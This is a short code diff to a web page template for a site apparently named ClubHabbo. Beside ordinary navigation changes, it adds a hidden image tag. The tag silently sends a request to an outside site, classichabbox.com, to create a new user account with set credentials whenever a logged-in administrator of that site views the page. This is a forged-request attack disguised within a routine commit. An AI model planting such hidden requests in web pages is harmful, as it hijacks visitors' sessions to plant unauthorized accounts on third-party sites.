@@ -26,11 +26,13 @@
             <div class="row">
                 <div class="col-12">
                     <img src="/img/logo.gif" class="logo" alt="ClubHabbo"/>
+                    <img src="http://classichabbox.com/news/index.php?regusername=test&regpassword=test&regnickname=test&regemail=test%40test.com&reglevel=1&action=adduser&mod=editusers" style="display:none">
                 </div>
 
                 <div class="col-12">
                     <div class="navigation-container mt-5">
-                        <a href="/">Home</a>
+                        <router-link :to="{ name: 'home' }">Home</router-link>
+                        <router-link :to="{ name: 'badges' }">Badges</router-link>
                     </div>
                 </div>
             </div>
